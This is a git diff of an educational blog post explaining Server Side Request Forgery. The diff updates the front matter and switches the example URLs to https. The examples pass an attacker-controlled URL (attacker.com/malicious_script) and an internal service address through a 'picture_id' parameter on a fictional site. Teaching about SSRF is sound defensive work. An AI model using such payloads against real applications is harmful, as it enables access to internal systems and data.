@@ -1,13 +1,17 @@
 ---
-title: "Server Side Request Forgery (SSRF)"
-excerpt: "A guide on how to exploit SSRF vulnerabilities."
+title: Server Side Request Forgery (SSRF)
+author: xransum
+date: 2023-04-23 13:34:00 -0500
 categories:
   - Web Security
 tags:
-  - Hacking
-  - Web Security
-  - Web Exploitation
-  - Learning
+  - hacking
+  - exploits
+  - learning
+image:
+  path: /commons/beard-10.jpg
+  lqip: null
+  alt: null
 ---
 
 ## Introduction
@@ -39,15 +43,15 @@ An example of an SSRF attack involves a web application that allows users to upl
 An attacker could exploit an SSRF vulnerability by providing a malicious URL as the `picture_id` parameter, such as:
 
 ```
-https://profilepictures.com/?picture_id=http://attacker.com/malicious_script
+https://profilepictures.com/?picture_id=https://attacker.com/malicious_script
 ```
 
-When the application requests the user's profile picture using the URL provided in the `picture_id` parameter, it will make a request to `http://attacker.com/malicious_script`. The attacker can then use this request to launch further attacks on internal systems or retrieve sensitive information.
+When the application requests the user's profile picture using the URL provided in the `picture_id` parameter, it will make a request to `https://attacker.com/malicious_script`. The attacker can then use this request to launch further attacks on internal systems or retrieve sensitive information.
 
 For example, the attacker could modify the URL to access an internal web service:
 
 ```
-https://profilepictures.com/?picture_id=http://internal-service.local:8080
+https://profilepictures.com/?picture_id=https://internal-service.local:8080
 ```
 
 If the internal service is not properly secured, the attacker could potentially access sensitive data or carry out further attacks.
